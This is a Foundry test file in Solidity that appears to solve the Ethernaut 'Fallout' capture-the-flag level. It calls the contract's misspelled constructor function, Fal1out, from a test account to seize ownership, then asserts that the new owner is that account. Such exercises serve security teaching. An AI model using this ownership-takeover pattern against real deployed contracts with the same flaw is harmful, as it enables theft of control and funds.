// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import '../lib/forge-std/src/Test.sol';
import '../src/Fallout.sol';

contract FalloutTest is Test {
  Fallout target = Fallout(0x49B8b74C81DD81533dA56075cc78E6060540f5AB);

  function test() external {
    address alice = vm.addr(1);
    vm.deal(alice, 1 ether);
    vm.startPrank(alice);
    target.Fal1out();
    assertEq(target.owner(), alice);
  }
}
